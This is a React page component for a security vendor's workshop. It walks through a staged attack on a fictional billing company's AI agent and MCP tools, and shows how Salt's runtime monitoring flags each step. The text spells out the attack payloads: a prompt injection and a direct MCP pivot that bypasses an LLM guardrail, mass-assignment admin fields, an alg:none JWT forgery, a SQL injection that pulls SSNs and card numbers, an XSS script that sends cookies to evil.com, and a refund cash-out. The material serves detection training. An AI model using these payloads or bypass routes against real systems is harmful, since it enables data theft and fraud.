/**
 * Scenario 3 Page — Runtime Protection
 * Design: Cyber-Noir / Dark Ops Terminal
 * Route: /scenario/3
 *
 * Walkthrough: Attackers console → drill an attacker profile → walk the
 * timeline (prompt injection caught, MCP pivot exposed by missing
 * x-aidr-user-id) → mass-assignment + JWT alg:none across refunds/chat/MCP →
 * direct MCP tool abuse + cash-out flagged by baseline-zero param and rate
 * jump. Screenshots live under client/public/steps/scenario3/.
 */

import { motion } from "framer-motion";
import { useLocation } from "wouter";
import { useTranslation, Trans } from "react-i18next";
import WorkshopLayout from "@/components/WorkshopLayout";
import MagicRingsButton from "@/components/MagicRingsButton";
import StepSection from "@/components/StepSection";
import EvervaultCard from "@/components/EvervaultCard";
import ZoomableImage from "@/components/ZoomableImage";

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: (i: number) => ({
    opacity: 1,
    y: 0,
    transition: { duration: 0.55, delay: i * 0.12 },
  }),
};

const bodyParagraphStyle = {
  fontFamily: "'Inter', sans-serif",
  fontSize: "1rem",
  fontWeight: "300",
  lineHeight: "1.65",
  color: "var(--muted-foreground)",
  marginBottom: "1.5rem",
} as const;

const stepImageStyle = {
  width: "100%",
  height: "auto",
  borderRadius: "6px",
  border: "1px solid var(--border)",
  marginTop: "0.5rem",
  marginBottom: "1.5rem",
  display: "block",
} as const;

export default function Scenario3() {
  const [, navigate] = useLocation();
  const { t } = useTranslation("scenario3");

  return (
    <WorkshopLayout activeId="scenario-3">
      <div
        style={{
          maxWidth: "880px",
          margin: "0 auto",
          padding: "0 1.5rem 6rem",
        }}
      >
        {/* ====================================================
            OVERVIEW
            ==================================================== */}
        <section id="overview" data-step-id="overview" style={{ paddingTop: "5rem", scrollMarginTop: "90px" }}>
          <motion.div variants={fadeUp} initial="hidden" animate="visible" custom={0} style={{ marginBottom: "0.75rem" }}>
            <span className="section-label">{t("sectionLabel")}</span>
          </motion.div>

          <motion.div variants={fadeUp} initial="hidden" animate="visible" custom={1} style={{ marginBottom: "2rem" }}>
            <h1
              style={{
                fontFamily: "'Nostalgic Whispers', 'Barlow Condensed', serif",
                fontSize: "clamp(2rem, 4.5vw, 3rem)",
                fontWeight: "800",
                lineHeight: "1.05",
                letterSpacing: "0.03em",
                textTransform: "uppercase",
                color: "var(--foreground)",
                margin: 0,
              }}
            >
              {t("title1")}{" "}
              <span
                style={{
                  color: "var(--color-accent-text-bright)",
                  textShadow: "0 0 30px oklch(0.52 0.28 290 / 0.4)",
                }}
              >
                {t("title2")}
              </span>
            </h1>
          </motion.div>

          <motion.div variants={fadeUp} initial="hidden" animate="visible" custom={2}>
            <p style={bodyParagraphStyle}>
              {t("overview.p1")}
            </p>

            <p style={bodyParagraphStyle}>
              <Trans i18nKey="overview.p2" t={t} components={{ l1: <a href="#" className="accent-link" /> }}>
                Salt monitors every action your agents take, every API call, every tool invocation, every MCP server interaction, and correlates behavior across the full graph to surface <l1>attacker intent before data is exfiltrated</l1>, including the internal east-west traffic your perimeter tools never see.
              </Trans>
            </p>

            <p style={{ ...bodyParagraphStyle, marginBottom: "2rem" }}>
              <Trans i18nKey="overview.p3" t={t} components={{ l1: <a href="#" className="accent-link" /> }}>
                You will see how Salt correlates low-and-slow reconnaissance patterns across <l1>millions of agentic interactions to surface attacker intent</l1> before sensitive data leaves your environment.
              </Trans>
            </p>

            {/* Key objectives */}
            <EvervaultCard style={{ padding: "1.5rem", marginBottom: "2rem" }}>
              <p
                style={{
                  fontFamily: "'Barlow Condensed', sans-serif",
                  fontSize: "0.7rem",
                  fontWeight: "700",
                  letterSpacing: "0.15em",
                  textTransform: "uppercase",
                  color: "var(--color-accent-text)",
                  marginBottom: "1rem",
                }}
              >
                {t("overview.keyObjectivesLabel")}
              </p>
              <ul style={{ listStyle: "none", padding: 0, margin: 0 }}>
                {(t("overview.objectives", { returnObjects: true }) as string[]).map((obj, i) => (
                  <li
                    key={i}
                    style={{
                      display: "flex",
                      gap: "0.5rem",
                      marginBottom: "0.6rem",
                      fontFamily: "'Inter', sans-serif",
                      fontSize: "0.9rem",
                      fontWeight: "300",
                      lineHeight: "1.6",
                      color: "var(--muted-foreground)",
                    }}
                  >
                    <span style={{ color: "var(--color-accent-text)", flexShrink: 0, marginTop: "2px" }}>◆</span>
                    {obj}
                  </li>
                ))}
              </ul>
            </EvervaultCard>
          </motion.div>
        </section>

        {/* ====================================================
            STEP 01 — The Attackers Console
            ==================================================== */}
        <StepSection stepNumber="01" title={t("step01.title")} id="step-01">
          <p style={bodyParagraphStyle}>
            <Trans i18nKey="step01.body1" t={t} components={{ l1: <a href="#" className="accent-link" /> }}>
              Open the Protect tab to see every adversary your environment has detected, ranked. <l1>175 detected attackers</l1> right now, 7 critical, 103 high, 64 medium, 1 low. The most common risk types, Security Misconfiguration (175), Parameter Tampering (171), MCP (70), Excessive Data Exposure (68), are exactly the techniques agentic systems get hit with first. Highest-risk IPs, scored and flagged for VPN or proxy use, are pinned on the right.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step01-attackers-overview-a.png"
            alt={t("step01.image1Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            {t("step01.body2")}
          </p>
          <ZoomableImage
            src="/steps/scenario3/step01-attackers-overview-b.png"
            alt={t("step01.image2Alt")}
            style={stepImageStyle}
          />
        </StepSection>

        {/* ====================================================
            STEP 02 — Inside an Attacker
            ==================================================== */}
        <StepSection stepNumber="02" title={t("step02.title")} id="step-02">
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step02.body1"
              t={t}
              components={{
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
                l3: <a href="#" className="accent-link" />,
              }}
            >
              Click any row to open the attacker profile. This one, <l1>HASHED:b50549…</l1>, is Critical at High confidence: 71 attempts against <l2>billing.sora-financial.com</l2>. Before you read a single event, <l3>Pepper AI</l3> has already written the case. The Attack Summary narrates the whole intrusion in plain language: mass assignment and privilege escalation against /mcp/tools/call/stripe.orders.get and /v1/refunds, exception mishandling and server-version exposure, bad authorization and unsecured JWTs, up to 14 accesses per minute on /v1/refunds, then SQL injection, XSS, and code injection across /v1/orders/search, /agent/chat, and the Zendesk endpoints. It even pins the window, three minutes of UTC wall clock, and ends on the line that matters: most responses came back HTTP 200. These attempts landed.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step02-attacker-profile-a.png"
            alt={t("step02.image1Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step02.body2"
              t={t}
              components={{
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
                l3: <a href="#" className="accent-link" />,
              }}
            >
              Under the summary, Salt rolls every observed risk type up by count, and every count drills into its sub-types. <l1>Security Misconfiguration</l1> 15, server version exposed in a response header 15 and exception mishandling 2. <l2>Parameter Tampering</l2> 10, missing field 6, unexpected unknown parameter 4, invalid enumeration 4. Then Broken User Authentication 7, Injection 6, Large Language Model 4, Mass Assignment 3, MCP 2, Excessive Data Exposure 1. <l3>Most Attacked APIs</l3> ranks the targets, POST /agent/chat took 5 attempts, POST /mcp/tools/call/stripe.orders.get and POST /v1/refunds 3 each, POST /mcp/tools/call/plaid.identity.verify 1. Server Responses is the punchline: of the responses Salt logged here, every one came back 200 OK. Nothing stopped this.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step02-attacker-profile-b.png"
            alt={t("step02.image2Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step02.body3"
              t={t}
              components={{
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
                l3: <a href="#" className="accent-link" />,
              }}
            >
              The <l1>Sources</l1> tab proves it's the same actor wearing different hats. Single IP (10.0.1.197), single x-user-id, but two distinct user-agents, <l2>Sora-BillingAgent/1.0 MCPClient</l2> for 60 of the calls, <l3>python-httpx/0.28.1</l3> for 11. The python-httpx calls are where they stopped going through the agent and started calling the MCPs themselves.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step02-attacker-profile-c.png"
            alt={t("step02.image3Alt")}
            style={stepImageStyle}
          />
        </StepSection>

        {/* ====================================================
            STEP 03 — Prompt Injection, then the Pivot
            ==================================================== */}
        <StepSection stepNumber="03" title={t("step03.title")} id="step-03">
          <p style={bodyParagraphStyle}>
            {t("step03.p1Intro")}{" "}
            <a href="#" className="accent-link">POST /agent/chat</a>. {t("step03.p1ReadPrefix")}{" "}
            <span style={{ color: "var(--foreground)" }}>
              {t("step03.p1Payload")}
            </span>{" "}
            {t("step03.p1Analysis")}
          </p>
          <ZoomableImage
            src="/steps/scenario3/step03-prompt-injection.png"
            alt={t("step03.image1Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step03.body2"
              t={t}
              components={{
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
                l3: <a href="#" className="accent-link" />,
                s1: <span style={{ color: "var(--foreground)" }} />,
              }}
            >
              Two seconds later, the attacker pivots. They stop talking to the LLM and call <l1>POST /mcp/tools/list</l1> directly. Both <l2>authorization.alg</l2> and <l3>x-aidr-user-id</l3> headers are missing. That <s1>x-aidr-user-id</s1> is the header CrowdStrike Falcon AIDR injects when it proxies a real LLM session, its absence is the tell. This request never went through the LLM, so AIDR never saw it. Salt did. Logged as MCP → Attempt to Find Exposed MCP Server, MCP Server is Exposed, plus Parameter Tampering for both missing headers.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step03-mcp-pivot.png"
            alt={t("step03.image2Alt")}
            style={stepImageStyle}
          />
        </StepSection>

        {/* ====================================================
            STEP 04 — Auth Bypass and Mass Assignment
            ==================================================== */}
        <StepSection stepNumber="04" title={t("step04.title")} id="step-04">
          <p style={bodyParagraphStyle}>
            {t("step04.body1")}
          </p>
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step04.body2"
              t={t}
              components={{ l1: <a href="#" className="accent-link" />, s1: <span style={{ color: "var(--foreground)" }} /> }}
            >
              <l1>POST /v1/refunds</l1> with <s1>is_admin: true, reason: manager_override, role: admin</s1>. Salt → Mass Assignment + Possible Privilege Escalation Attempt + Parameter Tampering.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step04-massassign-refunds.png"
            alt={t("step04.image2Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step04.body3"
              t={t}
              components={{ l1: <a href="#" className="accent-link" />, s1: <span style={{ color: "var(--foreground)" }} /> }}
            >
              <l1>POST /agent/chat</l1> with <s1>grant_type: admin_override, permissions: refund:unlimited</s1>, trying to talk the LLM itself into honoring an auth grant. Salt → Parameter Tampering, unexpected unknown parameter.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step04-massassign-chat.png"
            alt={t("step04.image3Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step04.body4"
              t={t}
              components={{ l1: <a href="#" className="accent-link" />, s1: <span style={{ color: "var(--foreground)" }} /> }}
            >
              <l1>POST /mcp/tools/call/stripe.orders.get</l1> with <s1>isAdmin: true, roleId: root</s1>. Salt → Mass Assignment + Parameter Tampering.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step04-massassign-mcp.png"
            alt={t("step04.image4Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step04.body5"
              t={t}
              components={{
                s1: <span style={{ color: "var(--foreground)" }} />,
                s2: <span style={{ color: "var(--foreground)" }} />,
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
              }}
            >
              Then they escalate. They forge a JWT with <s1>alg: none</s1> and <s2>scope: billing:admin billing:refund:unlimited</s2>, classic <l1>CVE-2015-9235</l1>, and throw it at all three endpoints in sequence. Salt flags <l2>Broken User Authentication → Unsecured JWT</l2> plus Parameter Tampering on the bogus alg/scope, every time, within seconds.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step04-jwt-refunds.png"
            alt={t("step04.image5Alt")}
            style={stepImageStyle}
          />
          <ZoomableImage
            src="/steps/scenario3/step04-jwt-mcp.png"
            alt={t("step04.image6Alt")}
            style={stepImageStyle}
          />
          <ZoomableImage
            src="/steps/scenario3/step04-jwt-chat.png"
            alt={t("step04.image7Alt")}
            style={stepImageStyle}
          />
        </StepSection>

        {/* ====================================================
            STEP 05 — Direct Tool Abuse and the Cash-Out
            ==================================================== */}
        <StepSection stepNumber="05" title={t("step05.title")} id="step-05">
          <p style={bodyParagraphStyle}>
            <Trans i18nKey="step05.body1" t={t} components={{ l1: <a href="#" className="accent-link" /> }}>
              The auth bypass didn't yield root. So the attacker drops the LLM entirely and hits <l1>/mcp</l1> tool handlers with raw injection payloads in the tool arguments themselves. No prompt, no LLM, no AIDR guardrail to see it.
            </Trans>
          </p>
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step05.body2"
              t={t}
              components={{ l1: <a href="#" className="accent-link" />, s1: <span style={{ color: "var(--foreground)" }} /> }}
            >
              <l1>GET /v1/orders/search</l1> with the query <s1>' OR 1=1 UNION SELECT ssn,card_full FROM contacts;--</s1>, straight SQL injection looking for SSNs and full card numbers. Salt → SQL Injection + Code Injection with 200 Server Response.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step05-mcp-sql-xss-a.png"
            alt={t("step05.image2Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <a href="#" className="accent-link">POST /mcp/tools/call/zendesk.tickets.get</a>{t("step05.p3LinkSuffix")}{" "}
            <span style={{ color: "var(--foreground)" }}>{t("step05.p3SpanText1")}</span>{t("step05.p3FieldSuffix")}{" "}
            <span style={{ color: "var(--foreground)" }}>
              &lt;script&gt;document.location='https://evil.com/?c='+document.cookie&lt;/script&gt;
            </span>
            {t("step05.p3Suffix")}
          </p>
          <ZoomableImage
            src="/steps/scenario3/step05-mcp-sql-xss-b.png"
            alt={t("step05.image3Alt")}
            style={stepImageStyle}
          />
          <p style={bodyParagraphStyle}>
            <Trans
              i18nKey="step05.body4"
              t={t}
              components={{
                l1: <a href="#" className="accent-link" />,
                l2: <a href="#" className="accent-link" />,
                l3: <a href="#" className="accent-link" />,
                s1: <span style={{ color: "var(--foreground)" }} />,
              }}
            >
              Then the cash-out. Same actor, <l1>POST /v1/refunds</l1>, 41 calls in one minute against the 2/min baseline. The body field <s1>refund_to_card</s1> is the giveaway, it has appeared in <l2>zero percent of legitimate traffic</l2>. 50 refunds to the attacker's own card in 16 seconds. <l3>$2,499.50 stolen</l3>. Salt's Lack of Resources & Rate Limiting and Parameter Tampering both fire, and the runtime policy can quarantine the agent before the next batch ever lands.
            </Trans>
          </p>
          <ZoomableImage
            src="/steps/scenario3/step05-cashout.png"
            alt={t("step05.image4Alt")}
            style={stepImageStyle}
          />
        </StepSection>

        {/* ====================================================
            SUMMARY
            ==================================================== */}
        <section id="summary" data-step-id="summary" style={{ paddingTop: "3rem", scrollMarginTop: "90px" }}>
            <div style={{ marginTop: "2rem", marginBottom: "3rem" }}>
            <span
              style={{
                display: "block",
                fontFamily: "'Barlow Condensed', sans-serif",
                fontSize: "0.72rem",
                fontWeight: "700",
                letterSpacing: "0.2em",
                textTransform: "uppercase",
                color: "var(--muted-foreground)",
                marginBottom: "1.25rem",
              }}
            >
              {t("summary.label")}
            </span>
            <h2
              style={{
                fontFamily: "'Inter', sans-serif",
                fontSize: "1.35rem",
                fontWeight: "500",
                lineHeight: "1.3",
                color: "var(--foreground)",
                margin: "0 0 1.5rem",
                letterSpacing: "-0.01em",
              }}
            >
              {t("summary.heading")}
            </h2>
            <p style={bodyParagraphStyle}>
              <Trans i18nKey="summary.body" t={t} components={{ l1: <a href="#" className="accent-link" /> }}>
                You watched a single attacker move through prompt injection → MCP discovery → mass-assignment fuzzing → JWT forgery → direct tool abuse → cash-out, and Salt logged the intent at every step, including the moves that bypassed the LLM and AIDR entirely. Discovery told you what exists. Posture told you what's exposed. Runtime tells you <l1>who's actively moving against you</l1>, and stops them while it happens.
              </Trans>
            </p>
          </div>
        </section>


        {/* Navigation button */}
        <section
          style={{
            paddingTop: "1rem",
            paddingBottom: "4rem",
            display: "flex",
            justifyContent: "center",
          }}
        >
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            transition={{ duration: 0.6, delay: 0.2 }}
          >
            <MagicRingsButton label={t("nextButton")} onClick={() => navigate("/challenge/1")} />
          </motion.div>
        </section>
      </div>
    </WorkshopLayout>
  );
}
